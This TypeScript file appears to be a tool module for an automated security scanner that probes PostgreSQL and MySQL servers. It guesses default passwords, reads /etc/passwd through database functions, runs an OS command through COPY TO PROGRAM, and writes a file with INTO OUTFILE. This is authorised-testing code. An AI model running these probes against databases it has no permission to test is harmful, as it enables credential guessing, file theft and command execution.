// T72 — db_wire_probe
// PostgreSQL and MySQL wire-protocol probing: anon connect, RCE primitives.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'db_wire_probe',
  description:
    'Database wire-protocol security probe. Tests PostgreSQL and MySQL for unauthenticated access, ' +
    'dangerous built-in functions: COPY FROM PROGRAM (PostgreSQL RCE), pg_read_file, ' +
    'LOAD DATA LOCAL INFILE (MySQL), and INTO OUTFILE. Detection-only: runs a canary query to ' +
    'confirm code execution path availability without destructive write.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'host',       type: 'string', required: true,  description: 'Database host' },
    { name: 'port',       type: 'number', required: false, description: 'Database port (default: 5432 for postgres, 3306 for mysql)' },
    { name: 'db_type',    type: 'string', required: false, description: 'Database type: postgres / mysql / auto', default: 'auto' },
    { name: 'username',   type: 'string', required: false, description: 'Username (blank = anonymous)', default: 'postgres' },
    { name: 'password',   type: 'string', required: false, description: 'Password (blank = try empty/common)' },
    { name: 'database',   type: 'string', required: false, description: 'Database name to connect to', default: 'postgres' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Connection timeout ms', default: 10000 },
  ],
};

async function probePostgres(host: string, port: number, username: string, password: string, database: string, timeoutMs: number): Promise<Array<{ test: string; result: string; interesting: boolean; note: string }>> {
  const results: Array<{ test: string; result: string; interesting: boolean; note: string }> = [];

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let pg: any;
  // eslint-disable-next-line @typescript-eslint/ban-ts-comment
  // @ts-ignore — pg installed at runtime
  try { pg = await import('pg'); } catch {
    return [{ test: 'dependency', result: 'missing', interesting: false, note: 'pg package not installed — run: npm install pg' }];
  }

  const passwordsToTry = password ? [password] : ['', 'postgres', 'admin', 'password', 'root'];

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let client: any = null;
  let connected = false;

  for (const pwd of passwordsToTry) {
    try {
      client = new pg.Client({ host, port, user: username, password: pwd, database, connectionTimeoutMillis: timeoutMs, ssl: { rejectUnauthorized: false } });
      await client.connect();
      connected = true;
      results.push({ test: 'connect', result: `connected with password="${pwd || '(empty)'}"`, interesting: true, note: `PostgreSQL accepts ${username}/${pwd || '(empty)'}` });
      break;
    } catch (e) {
      results.push({ test: `connect_attempt_${pwd || 'empty'}`, result: String(e), interesting: false, note: 'Connection failed' });
    }
  }

  if (!connected || !client) return results;

  const queries: Array<{ name: string; sql: string; interestFn: (rows: unknown[]) => boolean; note: string }> = [
    { name: 'version',          sql: 'SELECT version()',                                        interestFn: r => r.length > 0, note: 'PostgreSQL version' },
    { name: 'current_user',     sql: 'SELECT current_user, pg_is_in_recovery()',                interestFn: r => r.length > 0, note: 'Current DB user + role' },
    { name: 'superuser_check',  sql: "SELECT usesuper FROM pg_user WHERE usename = current_user", interestFn: r => (r[0] as Record<string, unknown>)?.usesuper === true, note: 'Superuser status' },
    { name: 'pg_read_file',     sql: "SELECT pg_read_file('/etc/passwd', 0, 200)",               interestFn: r => r.length > 0 && String((r[0] as Record<string, unknown>)?.pg_read_file).includes('root'), note: 'pg_read_file — arbitrary file read' },
    { name: 'copy_from_program', sql: "COPY (SELECT 1) TO PROGRAM 'echo genesis_rce_test'",     interestFn: () => true, note: 'COPY FROM PROGRAM — OS command execution' },
    { name: 'large_object_lo',  sql: "SELECT lo_import('/etc/passwd')",                          interestFn: r => r.length > 0, note: 'lo_import — file read via large object' },
  ];

  for (const q of queries) {
    try {
      const res = await client.query(q.sql);
      const interesting = q.interestFn(res.rows);
      const rowStr = JSON.stringify(res.rows[0] || {}).substring(0, 100);
      results.push({ test: q.name, result: rowStr, interesting, note: q.note });
    } catch (e) {
      results.push({ test: q.name, result: String(e).substring(0, 80), interesting: false, note: q.note });
    }
  }

  await client.end().catch(() => { /* ignore */ });
  return results;
}

async function probeMySQL(host: string, port: number, username: string, password: string, database: string, timeoutMs: number): Promise<Array<{ test: string; result: string; interesting: boolean; note: string }>> {
  const results: Array<{ test: string; result: string; interesting: boolean; note: string }> = [];

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let mysql: any;
  // eslint-disable-next-line @typescript-eslint/ban-ts-comment
  // @ts-ignore — mysql2 installed at runtime
  try { mysql = await import('mysql2/promise'); } catch {
    return [{ test: 'dependency', result: 'missing', interesting: false, note: 'mysql2 package not installed — run: npm install mysql2' }];
  }

  const passwordsToTry = password ? [password] : ['', 'root', 'mysql', 'admin', 'password'];
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let conn: any = null;
  let connected = false;

  for (const pwd of passwordsToTry) {
    try {
      conn = await mysql.createConnection({ host, port, user: username, password: pwd, database, connectTimeout: timeoutMs, ssl: { rejectUnauthorized: false } });
      connected = true;
      results.push({ test: 'connect', result: `connected with password="${pwd || '(empty)'}"`, interesting: true, note: `MySQL accepts ${username}/${pwd || '(empty)'}` });
      break;
    } catch (e) {
      results.push({ test: `connect_attempt_${pwd || 'empty'}`, result: String(e), interesting: false, note: 'Connection failed' });
    }
  }

  if (!connected || !conn) return results;

  const queries: Array<{ name: string; sql: string; interestFn: (rows: unknown) => boolean; note: string }> = [
    { name: 'version',          sql: 'SELECT VERSION()',                                          interestFn: r => !!(r as unknown[]).length, note: 'MySQL version' },
    { name: 'current_user',     sql: 'SELECT USER(), CURRENT_USER()',                             interestFn: r => !!(r as unknown[]).length, note: 'Current DB user' },
    { name: 'file_priv',        sql: "SHOW GRANTS FOR CURRENT_USER()",                            interestFn: r => JSON.stringify(r).toUpperCase().includes('FILE'), note: 'FILE privilege — LOAD DATA / INTO OUTFILE available' },
    { name: 'load_file',        sql: "SELECT LOAD_FILE('/etc/passwd')",                           interestFn: r => !!(r as unknown[])[0] && JSON.stringify((r as unknown[])[0]).includes('root'), note: 'LOAD_FILE — arbitrary file read' },
    { name: 'into_outfile',     sql: "SELECT 'genesis_test' INTO OUTFILE '/tmp/genesis_test.txt'", interestFn: () => true, note: 'INTO OUTFILE — file write (RCE via web shell)' },
    { name: 'udf_check',        sql: "SELECT plugin_name FROM information_schema.plugins WHERE plugin_type='DAEMON'", interestFn: r => !!(r as unknown[]).length, note: 'UDF/plugin check — RCE via shared object' },
  ];

  for (const q of queries) {
    try {
      const [rows] = await conn.execute(q.sql);
      const interesting = q.interestFn(rows);
      const rowStr = JSON.stringify((rows as unknown[])[0] || {}).substring(0, 100);
      results.push({ test: q.name, result: rowStr, interesting, note: q.note });
    } catch (e) {
      results.push({ test: q.name, result: String(e).substring(0, 80), interesting: false, note: q.note });
    }
  }

  await conn.end().catch(() => { /* ignore */ });
  return results;
}

export const dbWireProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const host = String(params.host || '');
    const dbTypeParam = String(params.db_type || 'auto').toLowerCase();
    const username = String(params.username || 'postgres');
    const password = params.password ? String(params.password) : '';
    const database = String(params.database || 'postgres');
    const timeoutMs = Number(params.timeout_ms || 10000);

    if (!host) return { output: 'host required', parsed: { error: 'missing_host' } };

    let dbType = dbTypeParam;
    let port = Number(params.port || 0);

    if (dbType === 'auto') {
      // Try postgres first (5432), then mysql (3306)
      dbType = 'postgres';
      if (!port) port = 5432;
    } else if (!port) {
      port = dbType === 'mysql' ? 3306 : 5432;
    }

    let results: Array<{ test: string; result: string; interesting: boolean; note: string }> = [];

    if (dbType === 'postgres') {
      results = await probePostgres(host, port, username, password, database, timeoutMs);
    } else if (dbType === 'mysql') {
      results = await probeMySQL(host, port, username, password, database, timeoutMs);
    } else if (dbType === 'auto') {
      const pgResults = await probePostgres(host, 5432, username, password, database, timeoutMs);
      const myResults = await probeMySQL(host, 3306, username, password, database, timeoutMs);
      results = [...pgResults.map(r => ({ ...r, test: `pg_${r.test}` })), ...myResults.map(r => ({ ...r, test: `my_${r.test}` }))];
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `db_wire_probe — ${host}:${port} (${dbType})`,
      `Interesting findings: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ VULN    ' : '  ·       ';
      lines.push(`  ${flag}  [${r.test.padEnd(22)}]  ${r.note}`);
      if (r.interesting) lines.push(`            ${r.result.substring(0, 100)}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { host, port, db_type: dbType, interesting_count: interesting.length, interesting, results },
    };
  },
};
